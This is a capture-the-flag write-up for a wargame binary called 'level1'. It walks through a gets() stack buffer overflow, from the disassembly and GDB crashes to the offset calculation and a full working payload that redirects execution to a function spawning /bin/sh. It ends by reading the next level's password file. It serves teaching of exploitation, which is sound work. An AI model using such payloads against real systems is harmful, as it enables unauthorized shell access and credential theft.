# Level 1

## Initial Context

- One file: `level1`

## Solving the Challenge

Running the file without any argument block on an input.
Entering anything does not seems to anything.

```bash
$ echo | ./level1
$ echo a | ./level1
$ echo hello | ./level1
```

But a lot of characters seems to break it.

```bash
$ python -c 'print "A" * 128' | ./level1
Segmentation fault (core dumped)
```

Let's see with GDB.

```bash
$ gdb ./level1
(gdb) run <<< $(python -c 'print "A" * 128')
Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) bt
#0  0x41414141 in ?? ()
#1  0x41414141 in ?? ()
#2  0x41414141 in ?? ()
#3  0x41414141 in ?? ()
#4  0x41414141 in ?? ()
#5  0x41414141 in ?? ()
#6  0x41414141 in ?? ()
#7  0x41414141 in ?? ()
#8  0x41414141 in ?? ()
#9  0x41414141 in ?? ()
#10 0x41414141 in ?? ()
#11 0x41414141 in ?? ()
#12 0x41414141 in ?? ()
#13 0x00000000 in ?? ()
```

We can see a corruption of the stack.

By looking at the assembly code, we can see 2 interesting function, `main` and `run`, that are not calling each others.

```
$ objdump -d ./level1
...
08048444 <run>:
...
 8048472:       c7 04 24 84 85 04 08    movl   $0x8048584,(%esp)
 8048479:       e8 e2 fe ff ff          call   8048360 <system@plt>
 804847e:       c9                      leave
 804847f:       c3                      ret

08048480 <main>:
 8048480:       55                      push   %ebp
 8048481:       89 e5                   mov    %esp,%ebp
 8048483:       83 e4 f0                and    $0xfffffff0,%esp
 8048486:       83 ec 50                sub    $0x50,%esp
 8048489:       8d 44 24 10             lea    0x10(%esp),%eax
 804848d:       89 04 24                mov    %eax,(%esp)
 8048490:       e8 ab fe ff ff          call   8048340 <gets@plt>
 8048495:       c9                      leave
 8048496:       c3                      ret
 8048497:       90                      nop
...
```

`main` is using `gets`, which is exploitable since `gets` will store data until it find an EOF without taking into account the buffer size.

By looking at the assembly code, we can see that `main` is also reserving `0x50` bytes for local variables, and is storing the `gets` buffer at an offset of `0x10`. Meaning that the buffer should be `0x50 - 0x10 = 0x40` or `64`. 

We now need to find the number of byte that will be required to break the stack.
This number must be above the buffer size (`64`) and by an increment of 4 (since we are in 32bit).

By slowing incrementing, 80 bytes (20 * 4) seem to break the stack.

```bash
$ gdb ./level1
(gdb) run <<< $(python -c 'print "ABCD" * 20')
Program received signal SIGSEGV, Segmentation fault.
0x44434241 in ?? ()
(gdb) bt
#0  0x44434241 in ?? ()
#1  0x00000000 in ?? ()
```

We can also see that the values are in little-endian since the "string" is reversed.
So by using 76 dummy bytes followed by a valid function address, we can redirect the stack.

The `run` function is located at `0x08048444` (or `44 84 04 08` in LE).

```bash
$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' | ./level1
Good... Wait what?
Segmentation fault (core dumped)
```

We can see a message, but its still crashing.

By looking further at the `run` function, we can see that it calls `system("/bin/sh")`.
But by using a pipe, stdin is closed right after it finished sending our payload. We need to keep it open.

For that we can first put our payload into a file.
Then we need to read it with `cat`, but with re-reading stdin, and sending everything into the pipe.

```bash
$ python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit
$ cat /tmp/exploit - | ./level1
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
<flag>
```
